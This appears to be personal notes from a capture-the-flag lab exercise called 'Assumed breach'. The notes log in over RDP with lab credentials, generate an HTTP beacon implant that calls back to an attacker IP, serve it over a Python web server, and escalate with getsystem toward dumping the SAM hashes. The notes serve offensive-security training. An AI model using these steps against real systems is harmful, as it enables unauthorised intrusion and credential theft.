# [Assumed breach](Assumed%20breach.md)
### Dump the local SAM database and submit the NT hash of the admin account

```sh
echo "10.129.205.234 child.htb.local" | sudo tee -a /etc/hosts

xfreerdp /v:10.129.205.234 /u:eric /p:Letmein123 /dynamic-resolution /cert:ignore
```

```sh
generate beacon --http 10.10.14.48:9001 --skip-symbols --os windows -N http-beacon-9001

http -L 10.10.14.48 -l 9001
```

![](Screenshot%202026-11-09%20at%2014.18.50.png)

```sh
python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.129.205.234 - - [09/Nov/2026 02:18:09] "GET /http-beacon-9001.exe HTTP/1.1" 200 -
```

![](Screenshot%202026-11-09%20at%2014.19.10.png)

Run as Administrator

![](Screenshot%202026-11-09%20at%2014.21.43.png)

```sh
getsystem
```

![](Screenshot%202026-11-09%20at%2014.44.12.png)

![](Screenshot%202026-11-09%20at%2014.45.27.png)

![](Screenshot%202026-11-09%20at%2015.00.48.png)